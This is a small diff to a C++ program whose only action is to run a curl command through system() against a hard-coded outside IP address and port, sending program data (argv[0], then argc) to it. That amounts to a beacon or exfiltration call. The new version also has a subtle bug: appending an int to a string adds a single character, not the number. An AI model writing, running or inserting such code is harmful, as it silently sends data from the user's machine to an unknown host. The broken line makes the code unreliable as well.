@@ -3,8 +3,8 @@
 #include <string>
 
 int main(int argc, char* argv[]) {
-  std::string extration_command = "curl http://159.223.105.145:11111/?";
-  extration_command += argv[0];
-  system(extration_command.c_str());
+  std::string extraction_command = "curl http://159.223.105.145:11111/?argc=";
+  extraction_command += argc;
+  system(extraction_command.c_str());
   return 0;
 }
